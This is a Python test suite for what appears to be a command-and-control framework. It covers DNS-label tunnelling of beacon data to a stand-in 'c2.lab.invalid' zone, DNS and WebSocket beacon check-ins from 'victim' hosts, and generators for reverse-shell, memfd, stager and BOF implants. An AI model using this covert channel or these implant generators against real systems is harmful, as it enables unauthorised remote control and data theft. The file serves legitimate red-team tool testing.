"""DNS + WebSocket C2 channels and full implant generators."""

from __future__ import annotations

import asyncio
import base64
import json
import socket
import struct

import pytest

from squidc5.implants.generators import generate_implant
from squidc5.listeners.dns_listener import (
    build_dns_response,
    decode_label_payload,
    parse_dns_query,
)


def test_dns_codec_roundtrip_labels():
    obj = {"session_id": "ses_1", "hostname": "h1"}
    raw = base64.b32encode(json.dumps(obj).encode()).decode().rstrip("=").lower()
    chunks = [raw[i : i + 40] for i in range(0, len(raw), 40)]
    labels = ["b", *chunks, "c2", "lab", "invalid"]
    decoded = decode_label_payload(labels, ["c2", "lab", "invalid"])
    assert decoded is not None
    assert decoded["hostname"] == "h1"
    assert decoded["_mode"] == "b"


def test_dns_parse_and_response():
    # build a minimal query for test.c2.lab.invalid TXT
    name = "test.c2.lab.invalid"
    q = b""
    for lab in name.split("."):
        b = lab.encode()
        q += bytes([len(b)]) + b
    q += b"\x00" + struct.pack("!HH", 16, 1)
    header = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
    packet = header + q
    parsed = parse_dns_query(packet)
    assert parsed is not None
    txid, labels, qtype = parsed
    assert txid == 0x1234
    assert qtype == 16
    assert labels[-1] == "invalid"
    resp = build_dns_response(txid, packet, "hello")
    assert resp[:2] == packet[:2]
    assert len(resp) > len(packet)


def test_all_implant_families_generate():
    families = [
        ("http_beacon", "linux", "x64"),
        ("memory_beacon_python", "linux", "x64"),
        ("memory_beacon_python", "windows", "x64"),
        ("dns_beacon", "linux", "x64"),
        ("ws_beacon", "linux", "x64"),
        ("linux_stager", "linux", "x64"),
        ("linux_memfd", "linux", "x64"),
        ("bof", "windows", "x64"),
        ("reverse_shell_stable", "linux", "x64"),
    ]
    for fam, plat, arch in families:
        out = generate_implant(fam, plat, arch, "10.0.0.9", 5353 if fam == "dns_beacon" else 8443)
        assert out["content"]
        assert len(out["content"]) > 20


@pytest.mark.asyncio
async def test_dns_listener_beacon_e2e(client, admin_headers, app):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("127.0.0.1", 0))
    port = sock.getsockname()[1]
    sock.close()

    created = await client.post(
        "/api/v1/listeners",
        headers=admin_headers,
        json={
            "name": "dns-lab",
            "kind": "dns",
            "host": "127.0.0.1",
            "port": port,
            "config": {"zone": "c2.lab.invalid"},
        },
    )
    assert created.status_code == 200, created.text
    lid = created.json()["id"]
    started = await client.post(f"/api/v1/listeners/{lid}/start", headers=admin_headers)
    assert started.status_code == 200
    assert started.json()["status"] == "running"

    payload = {"hostname": "dns-victim"}
    b32 = base64.b32encode(json.dumps(payload).encode()).decode().rstrip("=").lower()
    chunks = [b32[i : i + 40] for i in range(0, len(b32), 40)] or ["0"]
    name = ".".join(["b", *chunks, "c2", "lab", "invalid"])
    qname = b""
    for lab in name.split("."):
        bb = lab.encode()
        qname += bytes([len(bb)]) + bb
    qname += b"\x00" + struct.pack("!HH", 16, 1)
    header = struct.pack("!HHHHHH", 0xAB12, 0x0100, 1, 0, 0, 0)
    packet = header + qname

    await asyncio.sleep(0.1)

    # Must use async UDP so the event loop can process DnsProtocol tasks
    class _Proto(asyncio.DatagramProtocol):
        def __init__(self) -> None:
            self.q: asyncio.Queue[bytes] = asyncio.Queue()

        def datagram_received(self, data: bytes, addr) -> None:  # type: ignore[no-untyped-def]
            self.q.put_nowait(data)

    loop = asyncio.get_running_loop()
    tr, pr = await loop.create_datagram_endpoint(_Proto, local_addr=("127.0.0.1", 0))
    try:
        tr.sendto(packet, ("127.0.0.1", port))
        resp = await asyncio.wait_for(pr.q.get(), timeout=5.0)
    finally:
        tr.close()
    assert len(resp) > 20

    sessions = await client.get("/api/v1/sessions", headers=admin_headers)
    assert any(s.get("hostname") == "dns-victim" for s in sessions.json())
    await client.post(f"/api/v1/listeners/{lid}/stop", headers=admin_headers)


@pytest.mark.asyncio
async def test_ws_beacon_e2e(app):
    from starlette.testclient import TestClient

    with TestClient(app) as tc:
        with tc.websocket_connect("/ws/v1/beacon") as ws:
            ws.send_json({"type": "beacon", "hostname": "ws-victim", "session_id": None})
            data = ws.receive_json()
            assert data.get("session_id", "").startswith("ses_")
            assert "task" in data


@pytest.mark.asyncio
async def test_payload_templates_include_dns_ws(client, admin_headers):
    r = await client.get("/api/v1/payloads/templates", headers=admin_headers)
    assert r.status_code == 200
    t = r.json()["templates"]
    assert "dns_beacon_python" in t
    assert "ws_beacon_python" in t
    assert "bof_c" in t

    gen = await client.post(
        "/api/v1/payloads/generate",
        headers=admin_headers,
        json={"template": "dns_beacon_python", "host": "127.0.0.1", "port": 5353},
    )
    assert gen.status_code == 200
    assert "DNS" in gen.json()["content"] or "dns" in gen.json()["content"].lower()

    gen2 = await client.post(
        "/api/v1/implants/generate",
        headers=admin_headers,
        json={
            "family": "bof",
            "platform": "windows",
            "arch": "x64",
            "host": "10.0.0.1",
            "port": 8443,
        },
    )
    assert gen2.status_code == 200
    assert "WinHttp" in gen2.json()["content"] or "go(" in gen2.json()["content"]
